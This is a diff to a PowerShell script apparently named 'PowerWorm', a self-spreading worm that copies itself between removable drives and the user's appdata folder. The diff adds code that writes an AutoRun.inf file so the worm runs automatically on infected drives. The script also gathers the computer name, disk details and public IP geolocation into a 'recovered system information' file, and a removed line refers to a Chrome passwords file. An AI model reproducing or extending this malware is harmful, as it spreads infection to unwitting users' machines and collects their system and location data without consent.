@@ -2,7 +2,6 @@ $ScriptFile = Split-Path -Leaf $PSCommandPath
 $ScriptBytes = Get-Content -Encoding Byte -ReadCount 0 $PSCommandPath
 $Path = $env:appdata
 $SysInfo = Join-Path $Path "sysinfo.txt"
-$ChromePasswordsFile = Join-Path $Path "chrome-passwords.csv"
 
 if ($PWD.Path -ne $Path) {
     Write-Host "Running on removable drive. Spreading to PC disk."
@@ -22,6 +21,12 @@ if ($RemovableDrive -ne $null) {
     if (!(Test-Path $FilePath)) {
         $File = New-Item $FilePath -ItemType File
         Set-Content -Path $FilePath -Value $ScriptBytes -Encoding Byte
+        $AutoRunPath = Join-Path $RemovableDrive.DeviceID "AutoRun.inf"
+        if (!(Test-Path $AutoRunPath)) {
+			$AutoRunContent = "[AutoRun]`r`nopen=$ScriptFile"
+			Set-Content -Path $AutoRunPath -Value $AutoRunContent -Encoding Default
+			Write-Host "AutoRun Exploit created on removable drive."
+		}
         Write-Host "File '$ScriptFile' spread to drives: $($RemovableDrive.DeviceID)."
     }
 } else {
@@ -38,8 +43,8 @@ $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" | Select-Objec
 $ip = Invoke-RestMethod -Uri "http://ipinfo.io/json" | Select-Object ip, city, region, country, loc
 
 # Create file and write system information to it
-if (!(Test-Path $FilePath)) {
-    $File = New-Item $FilePath -ItemType File
+if (!(Test-Path $SysInfo)) {
+    $File = New-Item $SysInfo -ItemType File
     $Content = "PowerWorm Recovered System Information:
 
 Computer Name: $computerName
@@ -58,5 +63,5 @@ Country Name: $($ip.country)
 Co-ordinates: $($ip.loc)
 -------------------------------------------------------------------------------------------------------
 "
-    Set-Content -Path $FilePath -Value $Content -Encoding Default
+    Set-Content -Path $SysInfo -Value $Content -Encoding Default
 }
